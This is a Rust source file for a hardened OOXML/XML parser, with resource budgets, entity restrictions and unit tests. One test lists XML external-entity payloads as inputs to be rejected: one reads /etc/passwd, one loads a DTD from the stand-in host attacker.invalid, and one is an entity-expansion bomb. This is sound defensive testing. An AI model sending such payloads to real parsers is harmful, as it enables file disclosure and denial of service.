pub(crate) fn parse_xml_strict(
    xml: &[u8],
    part: &str,
    budget: &mut ParseBudget<'_>,
) -> Result<XmlDocument, ParseError> {
    budget.charge_xml_bytes(xml.len(), part)?;
    let mut reader = Reader::from_reader(xml);
    reader.config_mut().trim_text(false);
    reader.config_mut().check_end_names = true;

    let mut roots = Vec::new();
    let mut stack: Vec<XmlElement> = Vec::new();
    let mut paragraphs = 0u32;
    let mut number = |mut element: XmlElement, ancestors: &[XmlElement]| {
        if element.name == "w:p" {
            element.paragraph_ordinal = Some(paragraphs);
            paragraphs += 1;
            element.para_id_attribute = crate::paragraph_identity::word_para_id_name(
                element.attributes.keys().map(String::as_str),
                |prefix| {
                    let declaration = format!("xmlns:{prefix}");
                    std::iter::once(&element)
                        .chain(ancestors.iter().rev())
                        .find_map(|scope| scope.attributes.get(&declaration))
                        .map(String::as_str)
                },
            )
            .map(str::to_owned);
        }
        element
    };
    loop {
        let event = reader
            .read_event()
            .map_err(|error| malformed(&reader, part, error))?;
        budget.charge_event(part)?;
        match event {
            Event::Start(start) => {
                if stack.len() + 1 > budget.limits.max_xml_depth {
                    return Err(ParseError::ResourceLimit {
                        kind: "xmlDepth",
                        part: part.to_owned(),
                    });
                }
                let element = decode_element(&reader, start, part, budget)?;
                let element = number(element, &stack);
                stack.push(element);
            }
            Event::Empty(start) => {
                if stack.len() + 1 > budget.limits.max_xml_depth {
                    return Err(ParseError::ResourceLimit {
                        kind: "xmlDepth",
                        part: part.to_owned(),
                    });
                }
                let element = decode_element(&reader, start, part, budget)?;
                let mut element = number(element, &stack);
                retain_drawing_namespace_aliases(&mut element, &stack, part, budget)?;
                append_element(element, &mut stack, &mut roots, part)?;
            }
            Event::End(_) => {
                let mut element = stack.pop().ok_or_else(|| ParseError::MalformedXml {
                    part: part.to_owned(),
                    offset: reader.buffer_position(),
                    message: "unexpected closing element".to_owned(),
                })?;
                retain_drawing_namespace_aliases(&mut element, &stack, part, budget)?;
                append_element(element, &mut stack, &mut roots, part)?;
            }
            Event::Text(text) => {
                let decoded = text
                    .decode()
                    .map_err(|error| malformed(&reader, part, error))?;
                let unescaped = quick_xml::escape::unescape(&decoded)
                    .map_err(|error| malformed(&reader, part, error))?;
                budget.charge_text(unescaped.len(), part)?;
                append_text_node(
                    XmlNode::Text(unescaped.into_owned()),
                    &mut stack,
                    part,
                    reader.buffer_position(),
                )?;
            }
            Event::CData(text) => {
                let decoded = text
                    .decode()
                    .map_err(|error| malformed(&reader, part, error))?
                    .into_owned();
                budget.charge_text(decoded.len(), part)?;
                append_text_node(
                    XmlNode::CData(decoded),
                    &mut stack,
                    part,
                    reader.buffer_position(),
                )?;
            }
            Event::DocType(_) => {
                return Err(ParseError::UnsafeXml {
                    kind: "DTD/entity declarations are forbidden",
                    part: part.to_owned(),
                });
            }
            Event::Decl(_) | Event::PI(_) | Event::Comment(_) => {}
            Event::GeneralRef(reference) => {
                // quick-xml deliberately surfaces every reference separately.
                // Resolve only the five predefined XML entities and legal
                // numeric character references; there is no DTD entity table.
                let decoded = reference
                    .decode()
                    .map_err(|error| malformed(&reader, part, error))?;
                let resolved = if reference.is_char_ref() {
                    reference
                        .resolve_char_ref()
                        .map_err(|error| malformed(&reader, part, error))?
                        .filter(|character| is_legal_xml_character(*character))
                        .map(|character| character.to_string())
                } else {
                    quick_xml::escape::resolve_predefined_entity(&decoded).map(str::to_owned)
                };
                let Some(resolved) = resolved else {
                    return Err(ParseError::UnsafeXml {
                        kind: "non-predefined or illegal entity reference",
                        part: part.to_owned(),
                    });
                };
                budget.charge_text(resolved.len(), part)?;
                append_text_node(
                    XmlNode::Text(resolved),
                    &mut stack,
                    part,
                    reader.buffer_position(),
                )?;
            }
            Event::Eof => break,
        }
    }

    if !stack.is_empty() {
        return Err(ParseError::MalformedXml {
            part: part.to_owned(),
            offset: reader.buffer_position(),
            message: "unclosed element".to_owned(),
        });
    }
    Ok(XmlDocument { roots })
}

pub(crate) fn canonical_namespace(prefix: &str) -> Option<&'static str> {
    if !crate::serializer::parts::is_story_root_prefix(prefix) {
        return None;
    }
    STANDARD_NAMESPACES
        .iter()
        .find(|(standard, _)| *standard == prefix)
        .map(|(_, namespace)| *namespace)
}

fn retain_drawing_namespace_aliases(
    element: &mut XmlElement,
    ancestors: &[XmlElement],
    part: &str,
    budget: &mut ParseBudget<'_>,
) -> Result<(), ParseError> {
    if !matches!(element.local_name(), "pict" | "object") {
        return Ok(());
    }
    let mut bindings = IndexMap::new();
    for ancestor in ancestors {
        for (name, value) in &ancestor.attributes {
            if name == "xmlns" || name.starts_with("xmlns:") {
                let prefix = name.strip_prefix("xmlns:").unwrap_or("");
                if canonical_namespace(prefix) == Some(value.as_str()) {
                    bindings.shift_remove(name.as_str());
                } else {
                    bindings.insert(name.as_str(), value.as_str());
                }
            }
        }
    }
    if bindings.is_empty() {
        return Ok(());
    }
    let mut used_prefixes = std::collections::HashSet::new();
    let mut pending = vec![&*element];
    while let Some(node) = pending.pop() {
        used_prefixes.insert(node.namespace_prefix().unwrap_or("").to_owned());
        for (name, value) in &node.attributes {
            if matches!(
                local_name(name),
                "Ignorable"
                    | "MustUnderstand"
                    | "Requires"
                    | "ProcessContent"
                    | "PreserveElements"
                    | "PreserveAttributes"
            ) {
                for token in value.split_whitespace() {
                    used_prefixes.insert(
                        token
                            .split_once(':')
                            .map_or(token, |(prefix, _)| prefix)
                            .to_owned(),
                    );
                }
            }
            if let Some((prefix, _)) = name.split_once(':')
                && prefix != "xmlns"
            {
                used_prefixes.insert(prefix.to_owned());
            }
        }
        pending.extend(node.child_elements());
    }
    let mut attribute_bytes: usize = element
        .attributes
        .iter()
        .map(|(key, value)| key.len() + value.len())
        .sum();
    for (name, value) in bindings {
        let prefix = name.strip_prefix("xmlns:").unwrap_or("");
        if !used_prefixes.contains(prefix) || element.attributes.contains_key(name) {
            continue;
        }
        attribute_bytes += name.len() + value.len();
        if element.attributes.len() >= budget.limits.max_attributes_per_element
            || attribute_bytes > budget.limits.max_attribute_bytes
        {
            return Err(ParseError::ResourceLimit {
                kind: "drawingNamespaceAliases",
                part: part.to_owned(),
            });
        }
        budget.charge_text(name.len() + value.len(), part)?;
        element.attributes.insert(name.to_owned(), value.to_owned());
    }
    Ok(())
}

fn decode_element(
    reader: &Reader<&[u8]>,
    start: BytesStart<'_>,
    part: &str,
    budget: &mut ParseBudget<'_>,
) -> Result<XmlElement, ParseError> {
    let name = reader
        .decoder()
        .decode(start.name().as_ref())
        .map_err(|error| malformed(reader, part, error))?
        .into_owned();
    budget.charge_text(name.len(), part)?;

    let mut attributes = IndexMap::new();
    let mut attribute_bytes = 0usize;
    for (index, attribute) in start.attributes().enumerate() {
        if index >= budget.limits.max_attributes_per_element {
            return Err(ParseError::ResourceLimit {
                kind: "attributesPerElement",
                part: part.to_owned(),
            });
        }
        let attribute = attribute.map_err(|error| malformed(reader, part, error))?;
        if attribute.value.contains(&b'<') {
            return Err(ParseError::MalformedXml {
                part: part.to_owned(),
                offset: reader.buffer_position(),
                message: "unescaped '<' in attribute value".to_owned(),
            });
        }
        let key = reader
            .decoder()
            .decode(attribute.key.as_ref())
            .map_err(|error| malformed(reader, part, error))?
            .into_owned();
        // Deliberately NOT decoded_and_normalized_value(): normalization folds
        // whitespace in attribute values, which would break byte-faithful round-trips.
        #[allow(deprecated)]
        let value = attribute
            .decode_and_unescape_value(reader.decoder())
            .map_err(|error| malformed(reader, part, error))?
            .into_owned();
        attribute_bytes = attribute_bytes
            .checked_add(key.len() + value.len())
            .ok_or_else(|| ParseError::ResourceLimit {
                kind: "attributeBytes",
                part: part.to_owned(),
            })?;
        if attribute_bytes > budget.limits.max_attribute_bytes {
            return Err(ParseError::ResourceLimit {
                kind: "attributeBytes",
                part: part.to_owned(),
            });
        }
        budget.charge_text(key.len() + value.len(), part)?;
        if attributes.insert(key.clone(), value).is_some() {
            return Err(ParseError::MalformedXml {
                part: part.to_owned(),
                offset: reader.buffer_position(),
                message: format!("duplicate attribute {key:?}"),
            });
        }
    }
    Ok(XmlElement {
        name,
        attributes,
        children: Vec::new(),
        paragraph_ordinal: None,
        para_id_attribute: None,
    })
}

fn append_element(
    element: XmlElement,
    stack: &mut [XmlElement],
    roots: &mut Vec<XmlElement>,
    part: &str,
) -> Result<(), ParseError> {
    if let Some(parent) = stack.last_mut() {
        parent.children.push(XmlNode::Element(element));
    } else {
        if !roots.is_empty() {
            return Err(ParseError::MalformedXml {
                part: part.to_owned(),
                offset: 0,
                message: "multiple root elements".to_owned(),
            });
        }
        roots.push(element);
    }
    Ok(())
}

fn append_text_node(
    node: XmlNode,
    stack: &mut [XmlElement],
    part: &str,
    offset: u64,
) -> Result<(), ParseError> {
    if let Some(parent) = stack.last_mut() {
        if let XmlNode::Text(text) = &node
            && let Some(XmlNode::Text(previous)) = parent.children.last_mut()
        {
            // Adjacent decoded text forms one DOM text node.
            previous.push_str(text);
            return Ok(());
        }
        parent.children.push(node);
        return Ok(());
    }
    let text = match &node {
        XmlNode::Text(text) | XmlNode::CData(text) => text,
        XmlNode::Element(_) => unreachable!(),
    };
    if text.trim().is_empty() {
        return Ok(());
    }
    Err(ParseError::MalformedXml {
        part: part.to_owned(),
        offset,
        message: "text outside the root element".to_owned(),
    })
}

fn malformed(reader: &Reader<&[u8]>, part: &str, error: impl ToString) -> ParseError {
    ParseError::MalformedXml {
        part: part.to_owned(),
        offset: reader.buffer_position(),
        message: error.to_string(),
    }
}

pub(crate) fn escape_stray_ampersands(xml: &[u8]) -> std::borrow::Cow<'_, [u8]> {
    // Stray ampersands are repaired only in UTF-8 or ASCII input.
    let mut output: Option<Vec<u8>> = None;
    let mut index = 0;
    while index < xml.len() {
        if xml[index] != b'&' || is_entity_reference(&xml[index..]) {
            if let Some(output) = &mut output {
                output.push(xml[index]);
            }
            index += 1;
            continue;
        }
        let output = output.get_or_insert_with(|| xml[..index].to_vec());
        output.extend_from_slice(b"&amp;");
        index += 1;
    }
    output.map_or(std::borrow::Cow::Borrowed(xml), std::borrow::Cow::Owned)
}

pub(crate) fn is_legal_xml_character(character: char) -> bool {
    matches!(character, '\u{9}' | '\u{A}' | '\u{D}')
        || matches!(character as u32, 0x20..=0xD7FF | 0xE000..=0xFFFD | 0x10000..=0x10FFFF)
}

fn is_entity_reference(input: &[u8]) -> bool {
    if input.len() < 3 || input[0] != b'&' {
        return false;
    }
    let Some(end) = input.iter().position(|byte| *byte == b';') else {
        return false;
    };
    if end < 2 {
        return false;
    }
    let body = &input[1..end];
    if let Some(decimal) = body.strip_prefix(b"#") {
        if let Some(hex) = decimal
            .strip_prefix(b"x")
            .or_else(|| decimal.strip_prefix(b"X"))
        {
            return !hex.is_empty() && hex.iter().all(u8::is_ascii_hexdigit);
        }
        return !decimal.is_empty() && decimal.iter().all(u8::is_ascii_digit);
    }
    body[0].is_ascii_alphabetic()
        && body
            .iter()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b':'))
}

pub fn local_name(name: &str) -> &str {
    name.split_once(':').map_or(name, |(_, local)| local)
}

pub fn namespace_prefix(name: &str) -> Option<&str> {
    name.split_once(':').map(|(prefix, _)| prefix)
}

/// Parse integer twips or an OOXML universal measure into whole twips.
pub(crate) fn parse_twips_measure(value: &str, signed: bool) -> Option<f64> {
    let value = value.trim_matches([' ', '\t', '\r', '\n']);
    let unit = [
        ("mm", 1440.0 / 25.4),
        ("cm", 1440.0 / 2.54),
        ("in", 1440.0),
        ("pt", 20.0),
        ("pc", 240.0),
        ("pi", 240.0),
    ]
    .into_iter()
    .find_map(|(suffix, scale)| value.strip_suffix(suffix).map(|number| (number, scale)));
    let Some((number, scale)) = unit else {
        let digits = value.strip_prefix(['+', '-']).unwrap_or(value);
        if digits.is_empty() || !digits.bytes().all(|byte| byte.is_ascii_digit()) {
            return None;
        }
        return if signed {
            value.parse::<f64>().ok().filter(|value| value.is_finite())
        } else {
            value.parse::<u64>().ok().map(|value| value as f64)
        };
    };
    let digits = if signed {
        number.strip_prefix('-').unwrap_or(number)
    } else {
        number
    };
    let (integer, fraction) = digits
        .split_once('.')
        .map_or((digits, None), |(a, b)| (a, Some(b)));
    if integer.is_empty()
        || !integer.bytes().all(|byte| byte.is_ascii_digit())
        || fraction
            .is_some_and(|part| part.is_empty() || !part.bytes().all(|byte| byte.is_ascii_digit()))
    {
        return None;
    }
    let twips = number.parse::<f64>().ok()? * scale;
    twips.is_finite().then(|| twips.round())
}

pub(crate) fn parse_javascript_integer_prefix(value: &str) -> Option<f64> {
    let value = value.trim_start();
    let bytes = value.as_bytes();
    let mut end = usize::from(matches!(bytes.first(), Some(b'+' | b'-')));
    let start = end;
    while matches!(bytes.get(end), Some(byte) if byte.is_ascii_digit()) {
        end += 1;
    }
    if end == start {
        return None;
    }
    value[..end]
        .parse::<f64>()
        .ok()
        .filter(|value| value.is_finite())
}

fn escape_text(value: &str, output: &mut String) {
    for character in value.chars() {
        match character {
            '&' => output.push_str("&amp;"),
            '<' => output.push_str("&lt;"),
            '>' => output.push_str("&gt;"),
            _ => output.push(character),
        }
    }
}

fn escape_attribute(value: &str, output: &mut String) {
    for character in value.chars() {
        match character {
            '&' => output.push_str("&amp;"),
            '<' => output.push_str("&lt;"),
            '>' => output.push_str("&gt;"),
            '"' => output.push_str("&quot;"),
            '\'' => output.push_str("&apos;"),
            _ => output.push(character),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn twips_measures_convert_supported_units_and_validate_the_entire_value() {
        for value in ["25.4mm", "2.54cm", "1in", "72pt", "6pc", "6pi"] {
            assert_eq!(parse_twips_measure(value, false), Some(1440.0), "{value}");
            assert_eq!(
                parse_twips_measure(&format!("-{value}"), true),
                Some(-1440.0)
            );
            assert_eq!(parse_twips_measure(&format!("-{value}"), false), None);
        }
        for (value, expected) in [
            ("1440", 1440.0),
            ("+1440", 1440.0),
            (" \t1440\r\n", 1440.0),
            (" 10mm ", 567.0),
            ("0.5pt", 10.0),
            ("0mm", 0.0),
        ] {
            assert_eq!(parse_twips_measure(value, false), Some(expected), "{value}");
        }
        assert_eq!(parse_twips_measure("-720", true), Some(-720.0));
        assert_eq!(parse_twips_measure("-720", false), None);
        assert_eq!(parse_twips_measure("-1.25cm", true), Some(-709.0));
        for value in [
            "",
            "mm",
            ".5pt",
            "1.pt",
            "1.2.3pt",
            "+1pt",
            "1e2pt",
            "10px",
            "10PT",
            "10mmjunk",
            "10 mm",
            "0.5",
            "NaN",
            "Infinity",
            "--1pt",
            "18446744073709551616",
        ] {
            assert_eq!(parse_twips_measure(value, false), None, "{value}");
        }
        assert_eq!(
            parse_twips_measure(&format!("{}in", "9".repeat(310)), true),
            None
        );
    }

    fn parse(input: &str) -> Result<XmlDocument, ParseError> {
        let limits = ParseLimits::default();
        parse_xml(
            input.as_bytes(),
            "word/test.xml",
            &mut ParseBudget::new(&limits),
        )
    }

    #[test]
    fn reads_as_written_only_plain_xml() {
        let w = "xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"";
        let part = |body: &str| {
            format!(
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\r\n<w:document {w}><w:body>{body}</w:body></w:document>"
            )
        };
        let paragraph = "<w:p w:rsidR='00A1'><w:r><w:t xml:space=\"preserve\">A &amp; B &#x41;&#66; ]] &gt; \u{e9} </w:t></w:r></w:p>";
        for xml in [
            part(paragraph),
            format!("\u{feff}{}", part(paragraph)),
            part(paragraph).replacen(
                "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
                "<?xml version='1.0'?>",
                1,
            ),
            format!(
                "<w:document {w} xmlns=\"urn:x\" xmlns:mc=\"{}\"><w:body><mc:AlternateContent><mc:Choice Requires=\"x\"><p xmlns=\"\"/><x:p xmlns:x=\"urn:y\" x:a=\"1\" a=\"1\"/></mc:Choice></mc:AlternateContent></w:body></w:document>\n",
                namespaces::MC
            ),
            part("<w:p><w:r xml:space=\"preserve\"><w:t> a </w:t></w:r></w:p>"),
            part("<w:p><w:r><w:t>a  b</w:t></w:r></w:p>"),
            part("<w:p w:val=\"a\tb\r\nc\"/>"),
            part("<w:p>\r\n<w:r/>\r\n</w:p>"),
            part("<w:p><w:r><w:t>a\tb\r\nc&#10;d&#x9;e</w:t></w:r></w:p>"),
        ] {
            assert!(reads_as_written(xml.as_bytes()), "{xml}");
        }
        let declaration = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>";
        for (case, xml) in [
            (
                "stray ampersand",
                part("<w:p><w:r><w:t>A & B</w:t></w:r></w:p>"),
            ),
            (
                "undefined entity",
                part("<w:p><w:r><w:t>A&nbsp;B</w:t></w:r></w:p>"),
            ),
            (
                "reference to a control",
                part("<w:p><w:r><w:t>&#1;</w:t></w:r></w:p>"),
            ),
            (
                "reference to a noncharacter",
                part("<w:p w:val=\"&#xFFFE;\"/>"),
            ),
            (
                "control character",
                part("<w:p><w:r><w:t>\u{1}</w:t></w:r></w:p>"),
            ),
            (
                "noncharacter",
                part("<w:p><w:r><w:t>\u{ffff}</w:t></w:r></w:p>"),
            ),
            (
                "declared encoding",
                part("").replace("UTF-8", "windows-1252"),
            ),
            (
                "declaration without a version",
                part("").replacen(declaration, "<?xml?>", 1),
            ),
            (
                "declaration without a version, with an encoding",
                part("").replacen(declaration, "<?xml encoding=\"UTF-8\"?>", 1),
            ),
            ("version 1.1", part("").replacen("1.0", "1.1", 1)),
            (
                "declaration fields out of order",
                part("").replacen(
                    declaration,
                    "<?xml version=\"1.0\" standalone=\"yes\" encoding=\"UTF-8\"?>",
                    1,
                ),
            ),
            ("space before the declaration", format!(" {}", part(""))),
            ("late declaration", part("<?xml version=\"1.0\"?>")),
            ("processing instruction", part("<?pi x?>")),
            ("empty processing instruction", part("<??>")),
            ("comment", part("<!-- note -->")),
            ("control character in a comment", part("<!--\u{1}-->")),
            (
                "CDATA section",
                part("<w:p><w:r><w:t><![CDATA[x]]></w:t></w:r></w:p>"),
            ),
            (
                "document type",
                part("").replacen("<w:document", "<!DOCTYPE w:document><w:document", 1),
            ),
            (
                "character data end",
                part("<w:p><w:r><w:t>A ]]> B</w:t></w:r></w:p>"),
            ),
            ("invalid attribute name", part("<w:p bad?=\"x\"/>")),
            ("non-ASCII name", part("<w:p\u{e9}/>")),
            (
                "attributes without space",
                part("<w:p w:a=\"1\"w:b=\"2\"/>"),
            ),
            ("less-than in a value", part("<w:p w:a=\"<\"/>")),
            ("duplicate attribute", part("<w:p w:a=\"1\" w:a=\"2\"/>")),
            (
                "duplicate expanded name",
                part("<w:p><w:r xmlns:y=\"urn:d\" xmlns:z=\"urn:d\" y:a=\"1\" z:a=\"2\"/></w:p>"),
            ),
            (
                "standard prefix bound to another namespace",
                part("<w:p xmlns:r=\"urn:unrelated\"/>"),
            ),
            (
                "standard namespace under another prefix",
                part(&format!("<w:p xmlns:x=\"{}\"/>", namespaces::R)),
            ),
            (
                "standard namespace as the default",
                part(&format!("<w:p xmlns=\"{}\"/>", namespaces::W)),
            ),
            (
                "element of another namespace in a w element",
                part("<w:p><x:r xmlns:x=\"urn:x\"/></w:p>"),
            ),
            ("unprefixed element in a w element", part("<w:p><r/></w:p>")),
            (
                "unprefixed attribute on a WordprocessingML element",
                part("<w:bookmarkStart id=\"1\" w:name=\"b\"/>"),
            ),
            (
                "element in text",
                part("<w:p><w:r><w:t>a<w:b/></w:t></w:r></w:p>"),
            ),
            (
                "leading space without preserve",
                part("<w:p><w:r><w:t> a</w:t></w:r></w:p>"),
            ),
            (
                "leading referenced space without preserve",
                part("<w:p><w:r><w:t>&#x020;a</w:t></w:r></w:p>"),
            ),
            (
                "trailing referenced space without preserve",
                part("<w:p><w:r><w:delText>a&#32;</w:delText></w:r></w:p>"),
            ),
            (
                "preserve overridden by default",
                part(
                    "<w:p xml:space=\"preserve\"><w:r><w:t xml:space=\"default\">a </w:t></w:r></w:p>",
                ),
            ),
            ("carriage return in other text", part("<w:p>a\r</w:p>")),
            ("unbound element", part("<x:p/>")),
            ("unbound attribute", part("<w:p x:a=\"1\"/>")),
            ("element with the xmlns prefix", part("<xmlns:p/>")),
            ("empty prefixed declaration", part("<w:p xmlns:x=\"\"/>")),
            ("declared xmlns", part("<w:p xmlns:xmlns=\"urn:x\"/>")),
            ("xml rebound", part("<w:p xmlns:xml=\"urn:x\"/>")),
            (
                "xml namespace on another prefix",
                part("<w:p xmlns:x=\"http://www.w3.org/XML/1998/namespace\"/>"),
            ),
            (
                "xmlns namespace as the default",
                part("<w:p xmlns=\"http://www.w3.org/2000/xmlns/\"/>"),
            ),
            (
                "reference in a declaration",
                part("<w:p xmlns:x=\"urn:&amp;\"/>"),
            ),
            ("mismatched end tag", part("<w:p></w:r>")),
            ("unclosed element", part("<w:p>")),
            ("second root", format!("{}<w:document {w}/>", part(""))),
            ("text after the root", format!("{}text", part(""))),
            ("reference after the root", format!("{}&amp;", part(""))),
        ] {
            assert!(!reads_as_written(xml.as_bytes()), "{case}");
        }
        let mut latin1 = part("<w:p w:val=\"#\"/>").into_bytes();
        let at = latin1.iter().position(|&byte| byte == b'#').unwrap();
        latin1[at] = 0xE9;
        assert!(!reads_as_written(&latin1), "not UTF-8");
    }

    #[test]
    fn preserves_whitespace_repairs_stray_ampersands_and_supports_helpers() {
        let doc =
            parse("<w:p w:val=\"12px\"><w:r> left & right </w:r><w:r><![CDATA[<x>]]></w:r></w:p>")
                .unwrap();
        let root = doc.root().unwrap();
        assert!(root.matches_name("w", "p"));
        assert_eq!(
            root.parse_numeric_attribute(Some("w"), "val", 2.0),
            Some(24.0)
        );
        assert_eq!(root.text_content(), " left & right <x>");
        assert_eq!(root.children_named("w", "r").count(), 2);
        assert!(root.to_xml().contains(" left &amp; right "));
    }

    #[test]
    fn raw_inline_xml_escapes_attribute_values() {
        let doc = parse(r#"<x a="x&apos;y&gt;z&quot;q&lt;l&amp;m"/>"#).unwrap();
        assert_eq!(
            doc.root().unwrap().to_raw_inline_xml(),
            r#"<x a="x'y&gt;z&quot;q&lt;l&amp;m"/>"#
        );
        assert_eq!(
            doc.root().unwrap().to_xml(),
            r#"<x a="x&apos;y&gt;z&quot;q&lt;l&amp;m"/>"#
        );
    }

    #[test]
    fn parses_color_value_theme_and_tint() {
        let doc = parse("<w:color w:val=\"112233\" w:themeColor=\"accent1\" w:themeTint=\"80\"/>")
            .unwrap();
        assert_eq!(
            doc.root().unwrap().parse_color(),
            ParsedColor {
                value: Some("112233".to_owned()),
                theme_color: Some("accent1".to_owned()),
                theme_tint: Some("80".to_owned()),
                theme_shade: None,
            }
        );
    }

    #[test]
    fn rejects_dtd_xxe_and_entity_declarations() {
        for xml in [
            "<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
            "<!DOCTYPE x SYSTEM 'https://attacker.invalid/evil.dtd'><x/>",
            "<!DOCTYPE x [<!ENTITY a 'ha'><!ENTITY b '&a;&a;'>]><x>&b;</x>",
            "<!DOCTYPE x [<!ENTITY % p SYSTEM 'file:///tmp/p'>%p;]><x/>",
        ] {
            assert!(
                matches!(parse(xml), Err(ParseError::UnsafeXml { .. })),
                "{xml}"
            );
        }
    }

    #[test]
    fn accepts_only_predefined_and_numeric_references() {
        assert_eq!(
            parse("<x>&amp;&#65;&#x42;</x>")
                .unwrap()
                .root()
                .unwrap()
                .text_content(),
            "&AB"
        );
        assert!(matches!(
            parse("<x>&notDeclared;</x>"),
            Err(ParseError::UnsafeXml { .. } | ParseError::MalformedXml { .. })
        ));
    }

    #[test]
    fn enforces_depth_event_and_text_limits() {
        let limits = ParseLimits {
            max_xml_depth: 2,
            ..ParseLimits::default()
        };
        let error = parse_xml(
            b"<a><b><c/></b></a>",
            "deep.xml",
            &mut ParseBudget::new(&limits),
        )
        .unwrap_err();
        assert!(matches!(
            error,
            ParseError::ResourceLimit {
                kind: "xmlDepth",
                ..
            }
        ));

        let limits = ParseLimits {
            max_xml_text_bytes: 1,
            ..ParseLimits::default()
        };
        let error =
            parse_xml(b"<a>xx</a>", "text.xml", &mut ParseBudget::new(&limits)).unwrap_err();
        assert!(matches!(
            error,
            ParseError::ResourceLimit {
                kind: "xmlTextBytes",
                ..
            }
        ));
    }
}
